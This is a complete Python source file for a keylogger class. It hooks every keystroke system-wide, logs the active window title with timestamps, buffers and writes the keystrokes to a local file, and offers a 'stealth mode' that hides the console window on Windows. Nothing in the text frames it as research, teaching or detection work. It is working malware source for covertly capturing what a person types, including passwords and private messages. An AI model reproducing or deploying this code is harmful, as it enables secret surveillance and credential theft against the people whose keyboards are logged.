import keyboard
import threading
import time
from datetime import datetime
import platform
import sys


class Keylogger:
    """Advanced keylogger with window capture and stealth mode"""

    def __init__(
        self,
        output_file: str = "keylog.txt",
        stealth_mode: bool = False,
        capture_window: bool = True,
    ):
        self.output_file = output_file
        self.stealth_mode = stealth_mode
        self.capture_window = capture_window and platform.system() == "Windows"
        self.is_logging = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.last_window = ""

        if self.capture_window:
            try:
                import win32gui

                self.win32gui = win32gui
            except ImportError:
                print("pywin32 not installed. Window capture disabled.")
                self.capture_window = False

        if stealth_mode:
            self._hide_console()

    def _hide_console(self):
        """Hide console window (Windows only)"""
        if platform.system() == "Windows":
            import win32console
            import win32gui

            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)  # 0 = SW_HIDE

    def _get_active_window(self):
        """Get the currently active window title"""
        if not self.capture_window:
            return ""

        try:
            window = self.win32gui.GetForegroundWindow()
            return self.win32gui.GetWindowText(window)
        except:
            return ""

    def _on_keypress(self, event):
        """Handle key press events"""
        current_window = self._get_active_window()

        with self.buffer_lock:
            # Log window change
            if self.capture_window and current_window != self.last_window:
                if self.buffer:
                    self._flush_buffer()
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.buffer.append(f"\n[{timestamp}] Window: {current_window}\n")
                self.last_window = current_window

            # Log the key
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                if len(key) > 1:
                    key = f"[{key.upper()}]"
                self.buffer.append(key)

                # Flush buffer if it gets too large
                if len(self.buffer) > 100:
                    self._flush_buffer()

    def _flush_buffer(self):
        """Write buffer to file"""
        if self.buffer:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write("".join(self.buffer))
            self.buffer.clear()

    def run(self):
        """Start keylogging"""
        self.is_logging = True

        # Setup keyboard hook
        keyboard.hook(self._on_keypress)

        try:
            # Start periodic flush thread
            flush_thread = threading.Thread(target=self._periodic_flush, daemon=True)
            flush_thread.start()

            print(f"Keylogger started. Output: {self.output_file}")
            if not self.stealth_mode:
                print("Press Ctrl+C to stop...")

            # Keep main thread alive
            while self.is_logging:
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()
        finally:
            self.stop()

    def run_with_duration(self, duration: int):
        """Run keylogger for a specific duration"""
        self.is_logging = True

        def stop_after_delay():
            time.sleep(duration)
            self.stop()

        stop_thread = threading.Thread(target=stop_after_delay, daemon=True)
        stop_thread.start()

        self.run()

    def _periodic_flush(self):
        """Periodically flush buffer to file"""
        while self.is_logging:
            time.sleep(30)  # Flush every 30 seconds
            with self.buffer_lock:
                self._flush_buffer()

    def stop(self):
        """Stop keylogging"""
        if self.is_logging:
            self.is_logging = False
            keyboard.unhook_all()
            with self.buffer_lock:
                self._flush_buffer()
            print("Keylogger stopped.")
